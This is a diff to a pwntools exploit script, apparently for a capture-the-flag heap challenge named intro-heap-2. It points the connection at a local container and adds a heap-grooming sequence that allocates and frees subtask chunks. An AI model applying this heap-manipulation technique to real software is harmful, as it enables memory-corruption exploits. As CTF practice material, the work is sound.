@@ -9,7 +9,7 @@ context.terminal="/bin/kitty"
 target=ELF("./main")
 libc=ELF("target_libc.so.6")
 CN=None
-#CN = remote("172.17.0.2", 1024)
+CN = remote("172.17.0.2", 1024)
 #CN = remote("e71c7dd47499e4d37a1a0a8b-intro-heap-2.challenge.master.cscg.live", 31337, ssl=True)
 p=target.process()
 if isinstance(p, process) and CN is None:
@@ -43,14 +43,23 @@ def listTask():
     #print(tasks)
     return tasks
 
-def createSubTask(content:str, mainTaskId:int, length=None):
+def createSubTask(content, mainTaskId:int, length=None):
     if length==None:
         length=len(content)+1
     CN.send(b"4\n")
     CN.send(str(mainTaskId).encode('ascii')+b"\n")
     CN.send(str(length).encode('ascii')+b"\n")
-    CN.send(content.encode('ascii')+b"\n")
+    if isinstance(content,str):
+        contentmsg=content.encode('ascii')
+    elif isinstance(content, bytes):
+        contentmsg=content
+    else:
+        contentmsg=None
+        print("Wrong content type")
+    if contentmsg is not None:
+        CN.send(contentmsg+b"\n")
     CN.recvuntil(PROMPT)
+
 
 
 def deleteSubTask(mainTaskId:int, subTaskId:int):
@@ -75,14 +84,21 @@ def listSubTask(mainTaskId:int):
 def main():
     #pid=int(input("Enter pid: ").strip())
     
-    g=gdb.attach(p)
+    #g=gdb.attach(p)
     CN.recvuntil(PROMPT)
     createTask("A"*15)
     charset=string.ascii_uppercase
-    for i in range(5):
+    for i in range(13):
         createSubTask(charset[i]*0x99,0)
+    deleteSubTask(0,8)
+    deleteSubTask(0,10)
+    deleteSubTask(0,12)
     createTask("B"*15)
     createSubTask("1"*15,1)
+    #heapaddr=bytes.fromhex(input("Enter heap addr: "))
+    #reversedHeap=heapaddr[::-1]
+    #createSubTask(reversedHeap,0)
+    #print(reversedHeap.hex())
     #deleteSubTask(0,2)
     #deleteSubTask(0,4)
     #deleteSubTask(0,6)
